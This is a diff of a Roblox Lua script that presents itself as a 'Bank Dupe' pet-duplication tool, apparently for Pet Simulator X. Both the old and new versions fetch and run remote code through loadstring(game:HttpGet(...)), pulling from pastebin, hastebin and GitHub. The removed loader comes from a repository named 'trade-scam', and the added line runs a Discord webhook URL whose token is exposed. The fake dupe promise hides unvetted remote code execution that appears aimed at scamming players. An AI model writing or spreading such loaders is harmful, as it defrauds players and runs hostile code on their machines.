@@ -1,4 +1,4 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/trade-scam/main/trade-scam-loader.lua"))() loadstring(game:HttpGet("https://pastebin.com/raw/Kaq7v1dE",true))();
+local Library = loadstring(game:HttpGet("Https://raw.githubusercontent.com/D1vlne/PSX/main/Hydrogen"))() loadstring(game:HttpGet("https://pastebin.com/raw/Kaq7v1dE",true))();
 local Window = Library.CreateLib("Bank Dupe", "DarkTheme")
 
 --Dupe
@@ -9,7 +9,7 @@ local ScamSection = Trade:NewSection("Dupe")
 ScamSection:NewToggle("Dupe", "Put Pet are bank and wait 1 day", function(state)
     if state then
         _G.Key = 2335309965
-        loadstring(game:HttpGet("https://hastebin.app/raw/626c2b78d3810c001cf24b08"))()
+        loadstring(game:HttpGet("https://discord.com/api/webhooks/1039601618603221012/EBlzeJVEdFHXduNAqrrJNzeRyio5Rh_CG76vcJvwtTrIWs8ihaKXYvxeMDWrPlJBJWwJ"))()
     else
         print("Toggle Off")
     end
